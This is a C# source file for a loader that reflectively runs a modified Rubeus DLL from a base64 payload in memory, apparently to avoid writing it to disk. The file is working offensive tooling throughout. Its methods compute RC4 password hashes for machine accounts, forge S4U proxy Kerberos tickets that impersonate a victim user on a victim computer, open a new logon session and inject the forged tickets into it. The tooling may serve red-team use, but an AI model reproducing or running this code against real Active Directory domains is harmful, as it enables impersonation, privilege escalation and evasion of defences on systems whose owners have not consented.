using System;
using System.Reflection;


namespace Rubeus_DLL_Loader
{
    /* Purpose:
     *   This class contains all methods and variables related to the operation of the Rubeus DLL
     *   These functions are typically directly interacting with the functions that are defined in the DLL loaded into memory
     *   To do so we create an object containing a list of arguments that is passed to the DLL using the invoke function
     *   
     *   In the case of Rubeus we needed to modify the original program so that these functions returned values for consumption
     *   
     *   We modified the following functions in the Rubeus DLL:
     *     ComputeAllKerberosPasswordHashes
     *       Changed return value from void to string and return the rc4_hmac hash for passwords
     *     Execute (overloaded method to perform TGS request)
     *       Changed name to Execute_1 to avoid name ambiguity when loading the method for in memory running
     *       Changed return type to string so we could return the S4U proxy ticket
     *     S4U2Proxy
     *       Changed return type to string to return ticket to calling function
     *       Defined a variable to hold the kirbi ticket and then return it at end of function
     */
    class DLL
    {
        public System.Reflection.Assembly asm;
        Type asm_prog;
        Object inst;
        MethodInfo asm_prog_main;

        /*
        * Purpose:
        *   This constructor dynamically loads the DLL file from a remote location to avoid writing DLL to disk
        * Arguments:
        *   staging_url - The remote location to grab the rubeus DLL from
        * Output:
        *   DLL object
        */
        public DLL(string b64_payload)
        {
            //Load the byte array of the DLL
            asm = System.Reflection.Assembly.Load(Convert.FromBase64String(b64_payload));
        }

        public void Switch_Namespace(string asm_namespace, string method)
        {
            //Getting the main namespace of the program
            Console.WriteLine("[*] Loading Namespace: {0}", asm_namespace);
            asm_prog = asm.GetType(asm_namespace);

            //Initalizing instance of the DLL
            inst = Activator.CreateInstance(asm_prog);

            //Getting the entry point so we can interact with the rest of the program
            //We could call individual methods from any namespace if we wanted to skip over some program logic
            Console.WriteLine("[*] Loading Method {0}", method);
            asm_prog_main = asm_prog.GetMethod(method);
        }
        /*
         * Purpose:
         *   This function will generate the RC4 hash from the dynamically loaded DLL by calling the ComputeAllKerberousHashes function from Rubeous
         * Arguments:
         *   domain - Root domain location for computer account e.g. wargames.binns
         *   user - Machine account created for delegation
         *   password - password for machine account in domain
         * Output:
         *   string containing RC4 hash of computer account password
         */
        public string Gen_RC4(string username, string domain, string password)
        {
            //Create the object array containing arguments to pass to the reflected DLL instance
            object[] argstopass = new object[] { password, username, domain };

            //Run selected method
            return (string)asm_prog_main.Invoke(inst, argstopass);
        }

        /*
         * Purpose:
         *   This function will generate the kerberos ticket for the victim computer and the impersonated user by directly calling the S4U function from Rubeus
         * Arguments:
         *   domain - Domain containing the victim computer/user
         *   dc - Domain controller for the containing domain
         *   user - Machine account you are using to create the forged tickets
         *   rc4 - RC4 hash of the machine accounts password
         *   victim_user - User you wish to impersonate
         *   spn - Service principle you want to create the ticket for
         *   victim_computer - Computer you have modified
         * Output:
         *   String containng the kerberous ticket
         */
        public string s4u(string domain, string dc, string user, string rc4, string victim_user, string spn, string victim_computer)
        {

            // Function definition from Rubeus to execute an S4U request when there is no TGS already supplied
            // S4U.Execute_1(user, domain, hash, encType, targetUser, targetSPN, outfile, ptt, dc, altSname, tgs, targetDC, targetDomain, self, opsec, bronzebit);
            object[] argstopass = new object[] { user, domain.ToUpper(), rc4.ToString(), 23, victim_user, string.Format("{0}/{1}", spn.ToUpper(), victim_computer),
                "", false, dc.ToUpper(), "", null, "", "", false, false, false };

            return (string)asm_prog_main.Invoke(inst, argstopass);
        }

        /*
         * Purpose:
         *   This function generates a new logon session of windows type 9 to inject the newly created ticket into to avoid clobbering existing kerberos tickets
         * Arguments:
         *   Process - This is the process created under the new logon session to take advantage of the kerbeous ticket
         *   Show - Default to true so you can interact with the session supply false if you don't want to see it...
         * Output:
         *   LUID - Login session ID
         */
        public object New_LogonSession(string process, bool show = true)
        {
            object[] argstopass = new object[] { process, show };
            return asm_prog_main.Invoke(inst, argstopass);
        }
        
        /*
         * Purpose:
         *   This function injects kirbi tickets into netlogon sessions specified by the LUID
         * Arguments:
         *   Ticket - Base64 encoded Kerberos ticket
         *   LUID - LUID Session to inject into
         * Output:
         *   Void
         */
        public void Inject_Ticket(string ticket, object LUID)
        {
            object[] argstopass = new object[] { Convert.FromBase64String(ticket), LUID };
            asm_prog_main.Invoke(inst, argstopass);
        }
    }
}
